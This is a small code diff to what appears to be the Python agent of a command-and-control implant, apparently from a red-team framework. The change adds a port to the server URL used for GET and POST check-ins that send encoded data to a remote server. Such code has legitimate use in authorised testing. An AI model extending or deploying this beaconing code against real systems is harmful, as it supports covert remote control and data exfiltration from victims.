@@ -132,9 +132,9 @@ CRYPTO_HERE
         for header in self.agent_config["Headers"]:
             hdrs[header["name"]] = header["value"]
         if method == 'GET':
-            req = urllib.request.Request(self.agent_config["Server"] + self.agent_config["GetURI"] + "?" + self.agent_config["GetURI"] + "=" + data.decode(), None, hdrs)
+            req = urllib.request.Request(self.agent_config["Server"] + ":" + self.agent_config["Port"] + self.agent_config["GetURI"] + "?" + self.agent_config["GetURI"] + "=" + data.decode(), None, hdrs)
         else:
-            req = urllib.request.Request(self.agent_config["Server"] + self.agent_config["PostURI"], data, hdrs)
+            req = urllib.request.Request(self.agent_config["Server"] + ":" + self.agent_config["Port"] + self.agent_config["PostURI"], data, hdrs)
         #CERTSKIP
         if self.agent_config["ProxyHost"] and self.agent_config["ProxyPort"]:
             tls = "https" if self.agent_config["ProxyHost"][0:5] == "https" else "http"
